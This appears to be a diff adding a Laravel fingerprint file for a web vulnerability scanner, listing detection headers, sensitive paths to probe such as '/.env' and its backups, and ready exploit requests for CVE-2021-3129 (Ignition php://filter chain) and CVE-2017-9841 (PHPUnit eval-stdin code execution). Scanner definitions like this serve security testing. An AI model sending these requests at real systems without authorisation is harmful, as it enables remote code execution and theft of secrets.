@@ -1,0 +1,38 @@
+id: laravel
+name: Laravel
+detection:
+  headers:
+    - "Set-Cookie: laravel_session="
+  files:
+    - "/composer.json"
+
+sensitive_paths:
+  - "/.env"
+  - "/storage/logs/laravel.log"
+  - "/.env.backup"
+  - "/.env.old"
+  - "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+
+cves:
+  CVE-2021-3129:
+    name: "Ignition RCE"
+    severity: critical
+    method: POST
+    path: "/_ignition/execute-solution"
+    body: '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-8.utf-32le|convert.base64-decode/resource=../storage/logs/laravel.log"}}'
+  CVE-2017-9841:
+    name: "PHPUnit RCE"
+    severity: critical
+    method: POST
+    path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+    body: "<?php echo php_uname(); ?>"
+
+debug_mode_tests:
+  - method: POST
+    path: "/"
+    expect_status: 405
+  - method: GET
+    path: "/?param[]=0"
+    description: "Array parameter to trigger debug error"
+
+default_credentials: []
